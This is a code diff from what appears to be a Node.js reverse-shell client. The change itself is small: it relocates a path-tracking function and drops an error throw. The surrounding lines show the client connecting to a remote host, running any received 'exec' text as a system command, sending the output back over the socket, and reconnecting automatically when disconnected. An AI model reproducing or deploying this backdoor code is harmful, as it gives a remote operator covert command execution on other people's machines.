@@ -17,20 +17,8 @@ function connect() {
   });
 }
 
-function changePath(data) {
-  path = path.replace(/\\/g, " ").split(" ");
-  if (data.toString().toLowerCase() === "exec cd ..") {
-    path.pop();
-    path = path.join("\\");
-  } else if (data.toString().toLowerCase().includes("exec cd")) {
-		path.push(data.toString().split(" ").at(-1));
-		path = path.join("\\");
-  }
-}
-
 client.on("data", (data) => {
-
-	if (data.toString().toLowerCase().includes("cd")) changePath(data);
+  if (data.toString().toLowerCase().includes("cd")) changePath(data);
 
   async function execute(command) {
     await exec(
@@ -39,7 +27,6 @@ client.on("data", (data) => {
       (e, stdout, stderr) => {
         if (e instanceof Error) {
           client.write(e);
-          throw e;
         }
         client.write(`${stdout}\n`);
         // client.write(`stderr: ${stderr}\n`);
@@ -49,6 +36,17 @@ client.on("data", (data) => {
   if (data.toString().includes("exec"))
     execute(data.toString().replace("exec", ""));
 });
+
+function changePath(data) {
+  path = path.replace(/\\/g, " ").split(" ");
+  if (data.toString().toLowerCase() === "exec cd ..") {
+    path.pop();
+    path = path.join("\\");
+  } else if (data.toString().toLowerCase().includes("exec cd")) {
+    path.push(data.toString().split(" ").at(-1));
+    path = path.join("\\");
+  }
+}
 
 client.on("close", (e) => {
   console.log(`${host}:${port} not found. Attempting to reconnect.`);
